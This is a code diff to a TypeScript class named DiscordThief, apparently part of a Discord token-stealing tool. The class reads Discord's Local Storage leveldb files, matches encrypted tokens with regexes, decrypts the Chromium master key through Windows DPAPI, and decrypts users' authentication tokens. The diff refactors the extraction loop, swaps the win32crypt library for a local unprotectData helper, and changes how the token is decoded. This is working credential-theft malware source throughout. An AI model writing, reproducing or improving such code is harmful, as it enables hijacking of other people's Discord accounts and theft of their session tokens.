@@ -1,9 +1,8 @@
 import fsPromises from 'fs/promises'
 import path from 'path'
-import win32crypt from 'win32crypt'
 import crypto, { Word32Array } from 'jscrypto'
 
-import { getDiscordPath } from './utils'
+import { getDiscordPath, unprotectData } from './utils'
 import { ENCRYPTED_REGEX, UNENCRYPTED_REGEX } from './const'
 
 export class DiscordThief {
@@ -13,7 +12,6 @@ export class DiscordThief {
         const encryptionKey = await this.getEncryptionKey()
 
         const tokens: string[] = []
-        const encryptedTokens: string[] = []
 
         const dbPath = path.join(this.discordPath, 'Local Storage/leveldb')
         const dbFileNames = await fsPromises.readdir(dbPath)
@@ -41,22 +39,20 @@ export class DiscordThief {
                 const matches = data.match(regex)
 
                 if (matches) {
-                    encryptedTokens.push(matches[0])
-                }
-            }
+                    const [encryptedToken] = matches
 
-            for (const encryptedToken of encryptedTokens) {
-                let token = await this.decryptToken(
-                    encryptedToken,
-                    encryptionKey
-                )
+                    let token = await this.decryptToken(
+                        encryptedToken,
+                        encryptionKey
+                    )
 
-                if (token.endsWith('\\')) {
-                    token = token.replace('\\', '')
-                }
+                    if (token.endsWith('\\')) {
+                        token = token.replace('\\', '')
+                    }
 
-                if (token) {
-                    tokens.push(token)
+                    if (token) {
+                        tokens.push(token)
+                    }
                 }
             }
         }
@@ -82,8 +78,8 @@ export class DiscordThief {
             }
         )
 
-        const hex = decryptedBuffer.toString().slice(0, -16)
-        const decoded = Buffer.from(hex, 'hex').toString().split('�')[0]
+        const hex = decryptedBuffer.toString()
+        const decoded = Buffer.from(hex, 'hex').toString()
 
         return decoded
     }
@@ -94,7 +90,7 @@ export class DiscordThief {
         const state = JSON.parse(stateFileData)
 
         const encryptedKey = state.os_crypt.encrypted_key
-        const decryptedKey = win32crypt.unprotectData(
+        const decryptedKey = unprotectData(
             Buffer.from(encryptedKey, 'base64').subarray(5),
             null,
             'CurrentUser'
